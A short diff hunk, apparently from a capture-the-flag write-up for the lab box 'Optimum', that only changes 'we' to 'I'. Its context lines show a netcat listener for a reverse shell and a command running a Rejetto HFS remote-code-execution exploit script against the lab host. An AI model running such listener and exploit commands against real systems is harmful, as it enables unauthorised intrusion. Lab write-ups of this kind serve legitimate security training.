@@ -54,7 +54,7 @@ I then start my listener with:
 rlwrap nc -lnvp 443
 ```
 
-Now we execute the exploit with:
+Now I execute the exploit with:
 
 ```
 python2 rejetto_rce.py optimum.htb 80
